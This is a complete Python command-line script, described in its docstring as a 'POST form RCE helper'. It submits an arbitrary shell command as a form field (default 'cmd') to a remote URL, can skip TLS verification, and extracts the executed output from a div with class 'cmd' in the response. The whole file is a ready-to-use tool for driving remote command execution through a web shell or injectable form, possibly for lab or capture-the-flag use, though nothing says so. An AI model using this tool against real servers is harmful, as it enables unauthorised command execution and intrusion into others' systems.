#!/usr/bin/env python3
"""POST form RCE helper: run command, extract .cmd div text (forms stripped)."""

from __future__ import annotations

import argparse
import os
import re
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser

_VOID = frozenset(
    {
        "area",
        "base",
        "br",
        "col",
        "embed",
        "hr",
        "img",
        "input",
        "link",
        "meta",
        "param",
        "source",
        "track",
        "wbr",
    }
)


class _CmdDivParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.in_cmd = False
        self.cmd_depth = 0
        self.in_form = False
        self.form_depth = 0
        self.chunks: list[str] = []

    def _class_has_cmd(self, attrs) -> bool:
        for key, value in attrs:
            if key == "class" and value:
                return value == "cmd" or "cmd" in value.split()
        return False

    def handle_starttag(self, tag, attrs):
        if not self.in_cmd:
            if tag == "div" and self._class_has_cmd(attrs):
                self.in_cmd = True
                self.cmd_depth = 1
            return

        if self.in_form:
            if tag not in _VOID:
                self.form_depth += 1
            return

        if tag == "form":
            self.in_form = True
            self.form_depth = 0
            return

        if tag == "div":
            self.cmd_depth += 1

    def handle_endtag(self, tag):
        if self.in_form:
            if tag == "form":
                self.in_form = False
                self.form_depth = 0
                return
            if tag not in _VOID and self.form_depth > 0:
                self.form_depth -= 1
            return

        if not self.in_cmd:
            return

        if tag == "div":
            self.cmd_depth -= 1
            if self.cmd_depth <= 0:
                self.in_cmd = False

    def handle_data(self, data):
        if self.in_cmd and not self.in_form:
            self.chunks.append(data)


def extract_cmd_text(html: str) -> str:
    parser = _CmdDivParser()
    try:
        parser.feed(html or "")
        parser.close()
    except Exception:
        pass
    return "".join(parser.chunks).strip()


def default_url() -> str:
    return os.environ.get("POSTCMD_URL", "").strip()


def post_command(
    url: str,
    field: str,
    command: str,
    *,
    insecure: bool = False,
    extra: dict[str, str] | None = None,
) -> str:
    data = dict(extra or {})
    data[field] = command
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    ctx = ssl._create_unverified_context() if insecure else None
    with urllib.request.urlopen(req, timeout=30, context=ctx) as resp:
        html = resp.read().decode("utf-8", "replace")
    return extract_cmd_text(html)


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="POST a command; print .cmd div output with forms removed"
    )
    ap.add_argument("-u", "--url", default="", help="form URL (default: POSTCMD_URL)")
    ap.add_argument(
        "-f",
        "--field",
        default=os.environ.get("POSTCMD_FIELD", "cmd"),
        help="POST field name (default: cmd, or POSTCMD_FIELD)",
    )
    ap.add_argument("-F", "--form", action="append", default=[], metavar="KEY=VAL", help="extra POST field")
    ap.add_argument("-k", "--insecure", action="store_true", help="skip TLS verification")
    ap.add_argument(
        "-p",
        "--parse-only",
        action="store_true",
        help="parse HTML from stdin (no network)",
    )
    ap.add_argument("command", nargs=argparse.REMAINDER, help="remote command")
    args = ap.parse_args(argv)

    if args.parse_only:
        print(extract_cmd_text(sys.stdin.read()), end="")
        if not sys.stdin.isatty():
            print()
        return 0

    command = " ".join(args.command).strip()
    if not command:
        ap.error("command required")

    url = (args.url or default_url()).strip()
    if not url:
        print("postcmd: pass -u URL or export POSTCMD_URL", file=sys.stderr)
        return 1

    extra: dict[str, str] = {}
    for item in args.form:
        if "=" not in item:
            ap.error(f"invalid -F field: {item!r}")
        key, val = item.split("=", 1)
        extra[key] = val

    try:
        out = post_command(url, args.field, command, insecure=args.insecure, extra=extra or None)
    except urllib.error.URLError as exc:
        print(f"postcmd: {exc}", file=sys.stderr)
        return 1

    print(out, end="")
    if out:
        print()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
